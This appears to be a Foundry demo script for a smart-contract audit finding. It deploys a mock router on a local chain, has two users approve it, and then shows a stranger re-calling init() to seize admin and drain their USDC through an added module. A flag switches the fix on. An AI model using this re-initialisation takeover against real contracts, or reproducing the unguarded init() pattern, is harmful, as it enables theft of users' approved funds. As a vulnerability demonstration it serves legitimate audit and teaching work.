// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {Router} from "../src/Router.sol";
import {UpgradeModule, InitModule, WalletModule} from "../src/AdminModules.sol";
import {PaymentModule} from "../src/PaymentModule.sol";
import {MockUSDC} from "../src/MockUSDC.sol";
import {DrainModule, IDrain, IRouter} from "../test/Router.t.sol";

/// Live O1 on a local chain: deploy, two users approve the router once, then a stranger re-runs init() and drains them.
///   FIXES=0  (default) vulnerable    FIXES=1 re-init fixed    FIXES=15 everything fixed
/// Uses anvil's well-known dev keys (public, worthless).
contract Demo is Script {
    uint256 constant DEPLOYER = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80; // anvil #0
    uint256 constant ALICE = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;    // anvil #1
    uint256 constant BOB = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;      // anvil #2
    uint256 constant MALLORY = 0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6;  // anvil #3

    function run() external {
        uint256 fixes = vm.envOr("FIXES", uint256(0));
        address mallory = vm.addr(MALLORY);

        vm.startBroadcast(DEPLOYER);
        MockUSDC usdc = new MockUSDC();
        Router d = new Router(address(usdc), fixes, address(new UpgradeModule()));
        IRouter r = IRouter(address(d));
        bytes4[] memory a = new bytes4[](2);
        a[0] = IRouter.init.selector; a[1] = IRouter.owner.selector;
        r.setModule(a, address(new InitModule()));
        bytes4[] memory p = new bytes4[](1);
        p[0] = IRouter.executePayment.selector;
        r.setModule(p, address(new PaymentModule()));
        r.init(vm.addr(DEPLOYER)); // stands in for the multisig
        usdc.mint(vm.addr(ALICE), 1000e6);
        usdc.mint(vm.addr(BOB), 400e6);
        vm.stopBroadcast();

        vm.broadcast(ALICE);
        usdc.approve(address(d), type(uint256).max);
        vm.broadcast(BOB);
        usdc.approve(address(d), type(uint256).max);

        console.log("router (the one address users approve):", address(d));
        console.log("admin before:", r.owner());
        console.log("alice / bob (USDC):", usdc.balanceOf(vm.addr(ALICE)) / 1e6, usdc.balanceOf(vm.addr(BOB)) / 1e6);

        vm.prank(mallory); // dry run in the script's local EVM, not broadcast: would the stranger's init() go through?
        (bool ok,) = address(d).call(abi.encodeCall(IRouter.init, (mallory)));
        if (!ok) {
            console.log("BLOCKED: init() reverted (already initialized). admin stays:", r.owner());
            return;
        }
        vm.startBroadcast(MALLORY);
        r.init(mallory);
        bytes4[] memory s = new bytes4[](1);
        s[0] = IDrain.drain.selector;
        r.setModule(s, address(new DrainModule()));
        IDrain(address(d)).drain(vm.addr(ALICE), mallory);
        IDrain(address(d)).drain(vm.addr(BOB), mallory);
        vm.stopBroadcast();

        console.log("admin after:", r.owner());
        console.log("alice / bob (USDC):", usdc.balanceOf(vm.addr(ALICE)) / 1e6, usdc.balanceOf(vm.addr(BOB)) / 1e6);
        console.log("mallory (USDC):", usdc.balanceOf(mallory) / 1e6);
    }
}
